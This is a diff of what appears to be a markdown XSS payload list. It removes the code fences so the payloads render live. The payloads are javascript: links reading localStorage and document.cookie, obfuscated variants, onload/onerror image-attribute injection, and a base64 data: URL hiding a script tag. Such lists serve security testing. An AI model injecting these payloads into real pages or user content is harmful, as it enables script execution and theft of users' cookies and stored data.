@@ -14,24 +14,22 @@
 
 ## Links
 
-```markdown
 [Basic](javascript:alert('Basic'))
 [Local Storage](javascript:alert(JSON.stringify(localStorage)))
 [CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
 [URL](javascript://www.google.com%0Aalert('URL'))
 [In Quotes]('javascript:alert("InQuotes")')
-```
+
 
 ## Images
 
-```markdown
+
 ![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
 ![Escape SRC - onerror]("onerror="alert('ImageOnError'))
-```
 
 ## Fuzzing
 
-```markdown
+
 [XSS](javascript:prompt(document.cookie))
 [XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
 [XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
